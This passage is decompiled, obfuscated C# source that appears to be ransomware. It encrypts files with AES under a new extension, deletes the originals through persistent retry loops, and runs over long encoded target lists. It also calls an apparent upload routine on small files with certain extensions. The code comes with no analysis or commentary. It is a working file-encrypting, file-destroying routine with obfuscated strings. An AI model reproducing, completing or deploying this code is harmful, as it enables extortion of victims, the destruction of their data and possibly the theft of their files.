							if (!pNCPZOFhXOgiy.nKguzTWYAHcXu(QaGqIxJvWtgUo: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? FRFdLnqaFph.BWvSzInVLSLIKib(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : FRFdLnqaFph.BWvSzInVLSLIKib(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), NrVjtCgSTarJ: CS_0024_003C_003E8__locals0.tDwFwsGDrP, VLHQPqpLBGisux: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!UpNccIaFzBadyA)
						{
							if (!LjjjikaIyK.pPZVhaEwmPX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, CS_0024_003C_003E8__locals0.OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!LjjjikaIyK.pPZVhaEwmPX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (OtvlrYHFRq)
						{
							CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
						}
						string text3 = VfObglZXpshJy.puTvlrNJxrKCPF(32);
						string text4 = evlxOkrixnZkwgY.getString_0(107400934);
						text4 = (UpNccIaFzBadyA ? VfObglZXpshJy.ZAaQeGPmgdp() : evlxOkrixnZkwgY.getString_0(107400934));
						string s2 = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != evlxOkrixnZkwgY.getString_0(107397879))
						{
							if (!NbfRNVirWcO)
							{
								if (!UpNccIaFzBadyA)
								{
									xpGkySSqwDX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk);
								}
								else
								{
									xpGkySSqwDX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!UpNccIaFzBadyA)
									{
										KmXLFgoTfYmkE(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
									}
									else
									{
										KmXLFgoTfYmkE(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex11)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107397833) + ex11.Message + evlxOkrixnZkwgY.getString_0(107396514));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!NbfRNVirWcO)
						{
							if (!UpNccIaFzBadyA)
							{
								xpGkySSqwDX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107397874), nQCMwcWKyQk);
							}
							else
							{
								xpGkySSqwDX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107397874), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!UpNccIaFzBadyA)
								{
									KmXLFgoTfYmkE(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
								}
								else
								{
									KmXLFgoTfYmkE(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex14)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107397833) + ex14.Message + evlxOkrixnZkwgY.getString_0(107396514));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								return;
							}
						}
						if (UpNccIaFzBadyA)
						{
							if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != evlxOkrixnZkwgY.getString_0(107397879))
							{
								KFuNWiOQTHKqWciPe(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, bytes2);
							}
							else
							{
								KFuNWiOQTHKqWciPe(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bytes2);
							}
						}
					}
					end_IL_0348_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0b55;
			IL_0b55:
			CS_0024_003C_003E8__locals0.aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
		});
	}

	private static void szFtOlQGmOL(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (pRibgXhmfietto == getString_0(107396811))
					{
						foreach (string item in tnUDcbYyevrzGRJA)
						{
							if (string_0.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396811))
							{
								if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										AVKODeXgMr.tvyItwYqcU(getString_0(107401030), getString_0(107401025), getString_0(107400980), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396345))
							{
								try
								{
									AVKODeXgMr.tvyItwYqcU(getString_0(107401030), getString_0(107401025), getString_0(107400980), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107397857)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107397857), getString_0(107400917)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void KmXLFgoTfYmkE(string hoQSaPOVYDG, string jzgnsbpuVFLOnhop, byte[] jqAqYwlXNc, byte[] KEEDbAvDYqOuF = null)
	{
		try
		{
			if (pRibgXhmfietto == getString_0(107396811))
			{
				FileStream fileStream = new FileStream(hoQSaPOVYDG, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (hoQSaPOVYDG.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396811))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								AVKODeXgMr.tvyItwYqcU(getString_0(107401030), getString_0(107401025), getString_0(107400980), hoQSaPOVYDG);
							}
							catch
							{
							}
						}
					}
					else if (hoQSaPOVYDG.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396345))
					{
						try
						{
							AVKODeXgMr.tvyItwYqcU(getString_0(107401030), getString_0(107401025), getString_0(107400980), hoQSaPOVYDG);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (hoQSaPOVYDG != jzgnsbpuVFLOnhop)
		{
			File.Move(hoQSaPOVYDG, jzgnsbpuVFLOnhop);
			hoQSaPOVYDG = jzgnsbpuVFLOnhop;
		}
		byte[] bytes = FRFdLnqaFph.BWvSzInVLSLIKib(File.ReadAllBytes(hoQSaPOVYDG), jqAqYwlXNc, KEEDbAvDYqOuF);
		File.WriteAllBytes(hoQSaPOVYDG, bytes);
		DPjjDEUnrYJ++;
	}

	private static void xpGkySSqwDX(string string_0, string string_1, byte[] byte_0)
	{
		ZBEFzVzYsSt CS_0024_003C_003E8__locals0 = new ZBEFzVzYsSt();
		CS_0024_003C_003E8__locals0.JgoRvgBlnpx = string_0;
		CS_0024_003C_003E8__locals0.pnnxcTqhyFOc = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string pnnxcTqhyFOc = CS_0024_003C_003E8__locals0.pnnxcTqhyFOc;
			FileStream fileStream = new FileStream(pnnxcTqhyFOc, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (RrpEvBQBLONZKo == getString_0(107396811))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.Length > 0)
				{
					if (pRibgXhmfietto == getString_0(107396811))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in tnUDcbYyevrzGRJA)
						{
							if (CS_0024_003C_003E8__locals0.JgoRvgBlnpx.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396811))
							{
								if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										AVKODeXgMr.tvyItwYqcU(getString_0(107401030), getString_0(107401025), getString_0(107400980), CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.JgoRvgBlnpx.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396345))
							{
								try
								{
									AVKODeXgMr.tvyItwYqcU(getString_0(107401030), getString_0(107401025), getString_0(107400980), CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.EndsWith(getString_0(107397857)))
					{
						File.Move(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc, CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.Replace(getString_0(107397857), getString_0(107400917)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc))
							{
								File.Delete(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398611) + CS_0024_003C_003E8__locals0.JgoRvgBlnpx + getString_0(107397816) + ex2.Message + getString_0(107396497));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = tKhSHdXkDw;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397795)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> fcllHXSYzCkoLu = FcllHXSYzCkoLu;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397750)), string_0);
			};
		}
		Parallel.ForEach(fcllHXSYzCkoLu, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (XxUTdtdLXHJQFmlnR == getString_0(107396811))
		{
			string[] source2 = upziyoWzyCa;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397750)), getString_0(107398237) + string_0 + getString_0(107398228));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!rLhkxjtAGaYQ().Contains(getString_0(107397997)))
		{
			LaKkDEmcTxZa(fJgPhlsQHtYagv);
		}
		else
		{
			List<string> mRwbBvIEaNYw = MRwbBvIEaNYw;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					nYTitVLsoNLJb(OEjiexKEqeO(XOtQxzFPxuTjra(getString_0(107398255))), string_0);
				};
			}
			Parallel.ForEach(mRwbBvIEaNYw, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> kIKFUpmawnRBIE = KIKFUpmawnRBIE;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107398198)), string_0);
			};
		}
		Parallel.ForEach(kIKFUpmawnRBIE, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397795)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397750)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397750)), getString_0(107398237) + string_0 + getString_0(107398228));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		nYTitVLsoNLJb(OEjiexKEqeO(XOtQxzFPxuTjra(getString_0(107398255))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107398198)), string_0);
	}

	static tEjVFvrPgtsm()
	{
		Strings.CreateGetStringDelegate(typeof(tEjVFvrPgtsm));
		mkgreXsNDfWo = getString_0(107400536);
		nQCMwcWKyQk = null;
		QotWPeyjvzjx = getString_0(107396345);
		FoLsSeMcEVuV = getString_0(107398213);
		eaZULefnOUcJVI = new List<string>();
		DWWiJyUdyGLZ = new List<string>();
		mNPIOHsqKQLjYmM = getString_0(107396345);
		OxsDDfqLEi = getString_0(107400917);
		lXgIUpLgAi = getString_0(107400917);
		GThDVKInjH = getString_0(107400917);
		utoTLqCAZdXAT = getString_0(107396345);
		HxkcxNLXyTDaNa = 0;
		NgbDiBVJKDTW = getString_0(107396345);
		yyZHaDaxUisnQ = getString_0(107396345);
		bLsbDQXmZdNKY = getString_0(107396345);
		gRvYTwveWAbrj = getString_0(107398168);
		aYGZeCWKzRZALiE = getString_0(107396345);
		xssnOTnwBJDngh = getString_0(107396345);
		AUaVXVYfCAD = getString_0(107396345);
		DdPuPlUptL = getString_0(107396345);
		ZislTiThZFHv = new List<string>
		{
			OEjiexKEqeO(getString_0(107398163)),
			OEjiexKEqeO(getString_0(107398178)),
			OEjiexKEqeO(getString_0(107398153)),
			OEjiexKEqeO(getString_0(107398104)),
			OEjiexKEqeO(getString_0(107398079)),
			OEjiexKEqeO(getString_0(107398086)),
			OEjiexKEqeO(getString_0(107398037)),
			OEjiexKEqeO(getString_0(107398012)),
			OEjiexKEqeO(getString_0(107398019)),
			OEjiexKEqeO(getString_0(107397482)),
			OEjiexKEqeO(getString_0(107397433)),
			OEjiexKEqeO(getString_0(107397440)),
			OEjiexKEqeO(getString_0(107397415))
		};
		IDUZlSGaIfn = new List<string>();
		XaypzBwanzwZ = getString_0(107396345);
		EopvfOZJdoX = getString_0(107396345);
		bGtevrhmXNGWmrdhzSx = getString_0(107396345);
		JEkdiihxCoWf = new List<string>();
		HohHoEgJewvBWz = getString_0(107396345);
		JNWYtfmGycaH = getString_0(107397390);
		gsXyoeFOorGZ = getString_0(107396345);
		vNvhWDXlFGgZo = getString_0(107396345);
		SoVrjAqLQHDY = new List<string>
		{
			OEjiexKEqeO(getString_0(107397309)),
			OEjiexKEqeO(getString_0(107397276)),
			OEjiexKEqeO(getString_0(107397243)),
			OEjiexKEqeO(getString_0(107397722)),
			OEjiexKEqeO(getString_0(107397689)),
			OEjiexKEqeO(getString_0(107397660)),
			OEjiexKEqeO(getString_0(107397635)),
			OEjiexKEqeO(getString_0(107397606)),
			OEjiexKEqeO(getString_0(107397529)),
			OEjiexKEqeO(getString_0(107364184)),
			OEjiexKEqeO(getString_0(107364151)),
			OEjiexKEqeO(getString_0(107364118)),
			OEjiexKEqeO(getString_0(107364085)),
			OEjiexKEqeO(getString_0(107364056)),
			OEjiexKEqeO(getString_0(107364027)),
			OEjiexKEqeO(getString_0(107363986)),
			OEjiexKEqeO(getString_0(107363977)),
			OEjiexKEqeO(getString_0(107364400)),
			OEjiexKEqeO(getString_0(107364351)),
			OEjiexKEqeO(getString_0(107364318)),
			OEjiexKEqeO(getString_0(107364321)),
			OEjiexKEqeO(getString_0(107364248)),
			OEjiexKEqeO(getString_0(107364239)),
			OEjiexKEqeO(getString_0(107363694)),
			OEjiexKEqeO(getString_0(107363613)),
			OEjiexKEqeO(getString_0(107363588)),
			OEjiexKEqeO(getString_0(107363515)),
			OEjiexKEqeO(getString_0(107363486)),
			OEjiexKEqeO(getString_0(107363445)),
			OEjiexKEqeO(getString_0(107363900)),
			OEjiexKEqeO(getString_0(107363835)),
			OEjiexKEqeO(getString_0(107363810)),
			OEjiexKEqeO(getString_0(107363745)),
			OEjiexKEqeO(getString_0(107363152)),
			OEjiexKEqeO(getString_0(107363119)),
			OEjiexKEqeO(getString_0(107363030)),
			OEjiexKEqeO(getString_0(107362997)),
			OEjiexKEqeO(getString_0(107362988)),
			OEjiexKEqeO(getString_0(107362947)),
			OEjiexKEqeO(getString_0(107363382)),
			OEjiexKEqeO(getString_0(107363353)),
			OEjiexKEqeO(getString_0(107363288)),
			OEjiexKEqeO(getString_0(107363279)),
			OEjiexKEqeO(getString_0(107363246)),
			OEjiexKEqeO(getString_0(107363205)),
			OEjiexKEqeO(getString_0(107362612)),
			OEjiexKEqeO(getString_0(107362599)),
			OEjiexKEqeO(getString_0(107362494)),
			OEjiexKEqeO(getString_0(107362449)),
			OEjiexKEqeO(getString_0(107362436)),
			OEjiexKEqeO(getString_0(107362871)),
			OEjiexKEqeO(getString_0(107362862)),
			OEjiexKEqeO(getString_0(107362789)),
			OEjiexKEqeO(getString_0(107362760)),
			OEjiexKEqeO(getString_0(107362687)),
			OEjiexKEqeO(getString_0(107362110)),
			OEjiexKEqeO(getString_0(107362065)),
			OEjiexKEqeO(getString_0(107362036)),
			OEjiexKEqeO(getString_0(107362023)),
			OEjiexKEqeO(getString_0(107361958)),
			OEjiexKEqeO(getString_0(107361929)),
			OEjiexKEqeO(getString_0(107362352)),
			OEjiexKEqeO(getString_0(107362319)),
			OEjiexKEqeO(getString_0(107362278)),
			OEjiexKEqeO(getString_0(107362249)),
			OEjiexKEqeO(getString_0(107362208)),
			OEjiexKEqeO(getString_0(107361615)),
			OEjiexKEqeO(getString_0(107361522)),
			OEjiexKEqeO(getString_0(107361481)),
			OEjiexKEqeO(getString_0(107361404)),
			OEjiexKEqeO(getString_0(107361883)),
			OEjiexKEqeO(getString_0(107361842)),
			OEjiexKEqeO(getString_0(107361797)),
			OEjiexKEqeO(getString_0(107361720)),
			OEjiexKEqeO(getString_0(107361119)),
			OEjiexKEqeO(getString_0(107361102)),
			OEjiexKEqeO(getString_0(107361041)),
			OEjiexKEqeO(getString_0(107361032)),
			OEjiexKEqeO(getString_0(107360967)),
			OEjiexKEqeO(getString_0(107360886)),
			OEjiexKEqeO(getString_0(107361341)),
			OEjiexKEqeO(getString_0(107361308)),
			OEjiexKEqeO(getString_0(107361247)),
			OEjiexKEqeO(getString_0(107361222)),
			OEjiexKEqeO(getString_0(107363030)),
			OEjiexKEqeO(getString_0(107361165)),
			OEjiexKEqeO(getString_0(107360612)),
			OEjiexKEqeO(getString_0(107360523)),
			OEjiexKEqeO(getString_0(107360446)),
			OEjiexKEqeO(getString_0(107360417)),
			OEjiexKEqeO(getString_0(107360392)),
			OEjiexKEqeO(getString_0(107360827)),
			OEjiexKEqeO(getString_0(107360810)),
			OEjiexKEqeO(getString_0(107363900)),
			OEjiexKEqeO(getString_0(107360745)),
			OEjiexKEqeO(getString_0(107360704)),
			OEjiexKEqeO(getString_0(107360647)),
			OEjiexKEqeO(getString_0(107363835)),
			OEjiexKEqeO(getString_0(107360030)),
			OEjiexKEqeO(getString_0(107360013)),
			OEjiexKEqeO(getString_0(107359892)),
			OEjiexKEqeO(getString_0(107360339)),
			OEjiexKEqeO(getString_0(107360322)),
			OEjiexKEqeO(getString_0(107363745)),
			OEjiexKEqeO(getString_0(107360213)),
			OEjiexKEqeO(getString_0(107362997)),
			OEjiexKEqeO(getString_0(107363152)),
			OEjiexKEqeO(getString_0(107360180)),
			OEjiexKEqeO(getString_0(107360123)),
			OEjiexKEqeO(getString_0(107363119)),
			OEjiexKEqeO(getString_0(107359578)),
			OEjiexKEqeO(getString_0(107359561)),
			OEjiexKEqeO(getString_0(107359480)),
			OEjiexKEqeO(getString_0(107363445)),
			OEjiexKEqeO(getString_0(107359455)),
			OEjiexKEqeO(getString_0(107359410)),
			OEjiexKEqeO(getString_0(107359381)),
			OEjiexKEqeO(getString_0(107359352)),
			OEjiexKEqeO(getString_0(107359851)),
			OEjiexKEqeO(getString_0(107359818)),
			OEjiexKEqeO(getString_0(107359761)),
			OEjiexKEqeO(getString_0(107359748)),
			OEjiexKEqeO(getString_0(107359723)),
			OEjiexKEqeO(getString_0(107359682)),
			OEjiexKEqeO(getString_0(107359605)),
			OEjiexKEqeO(getString_0(107359076)),
			OEjiexKEqeO(getString_0(107359019)),
			OEjiexKEqeO(getString_0(107358986)),
			OEjiexKEqeO(getString_0(107358909)),
			OEjiexKEqeO(getString_0(107358876)),
			OEjiexKEqeO(getString_0(107358835)),
			OEjiexKEqeO(getString_0(107363486)),
			OEjiexKEqeO(getString_0(107359076)),
			OEjiexKEqeO(getString_0(107359338)),
			OEjiexKEqeO(getString_0(107359309)),
			OEjiexKEqeO(getString_0(107359248)),
			OEjiexKEqeO(getString_0(107359199)),
			OEjiexKEqeO(getString_0(107359158)),
			OEjiexKEqeO(getString_0(107359097)),
			OEjiexKEqeO(getString_0(107358512)),
			OEjiexKEqeO(getString_0(107358483)),
			OEjiexKEqeO(getString_0(107358450)),
			OEjiexKEqeO(getString_0(107358409)),
			OEjiexKEqeO(getString_0(107358380)),
			OEjiexKEqeO(getString_0(107358815)),
			OEjiexKEqeO(getString_0(107358750)),
			OEjiexKEqeO(getString_0(107358717)),
			OEjiexKEqeO(getString_0(107358672)),
			OEjiexKEqeO(getString_0(107358611)),
			OEjiexKEqeO(getString_0(107358578)),
			OEjiexKEqeO(getString_0(107358053)),
			OEjiexKEqeO(getString_0(107357988)),
			OEjiexKEqeO(getString_0(107357955)),
			OEjiexKEqeO(getString_0(107357882)),
			OEjiexKEqeO(getString_0(107357865)),
			OEjiexKEqeO(getString_0(107363613)),
			OEjiexKEqeO(getString_0(107357836)),
			OEjiexKEqeO(getString_0(107358259)),
			OEjiexKEqeO(getString_0(107358250)),
			OEjiexKEqeO(getString_0(107358173)),
			OEjiexKEqeO(getString_0(107358132)),
			OEjiexKEqeO(getString_0(107358119)),
			OEjiexKEqeO(getString_0(107357546)),
			OEjiexKEqeO(getString_0(107357465)),
			OEjiexKEqeO(getString_0(107357448)),
			OEjiexKEqeO(getString_0(107357391)),
			OEjiexKEqeO(getString_0(107357302)),
			OEjiexKEqeO(getString_0(107357801)),
			OEjiexKEqeO(getString_0(107357760)),
			OEjiexKEqeO(getString_0(107357703)),
			OEjiexKEqeO(getString_0(107363588)),
			OEjiexKEqeO(getString_0(107357598)),
			OEjiexKEqeO(getString_0(107357601)),
			OEjiexKEqeO(getString_0(107357568)),
			OEjiexKEqeO(getString_0(107356983)),
			OEjiexKEqeO(getString_0(107356954)),
			OEjiexKEqeO(getString_0(107363694)),
			OEjiexKEqeO(getString_0(107356913)),
			OEjiexKEqeO(getString_0(107356896)),
			OEjiexKEqeO(getString_0(107356867)),
			OEjiexKEqeO(getString_0(107361929)),
			OEjiexKEqeO(getString_0(107356834)),
